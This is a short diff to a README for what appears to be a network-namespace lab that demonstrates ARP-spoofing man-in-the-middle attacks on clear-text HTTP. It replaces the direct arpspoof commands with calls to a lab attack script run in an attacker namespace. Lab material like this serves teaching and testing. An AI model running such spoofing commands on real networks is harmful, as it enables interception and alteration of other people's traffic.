@@ -9,8 +9,8 @@ Observe and optionally alter clear-text HTTP traffic while attacker sits in-path
 
 ```bash
 sudo ip netns exec ns-atk sysctl -w net.ipv4.ip_forward=1
-sudo ip netns exec ns-atk arpspoof -i veth-atk -t 10.0.0.10 10.0.0.1
-sudo ip netns exec ns-atk arpspoof -i veth-atk -t 10.0.0.1 10.0.0.10
+sudo ip netns exec ns-atk bash attacks/01-arp-spoof/attack.sh -i veth-atk -t 10.0.0.10 -g 10.0.0.1
+sudo ip netns exec ns-atk bash attacks/01-arp-spoof/attack.sh -i veth-atk -t 10.0.0.1 -g 10.0.0.10
 ```
 
 ## Run interceptor
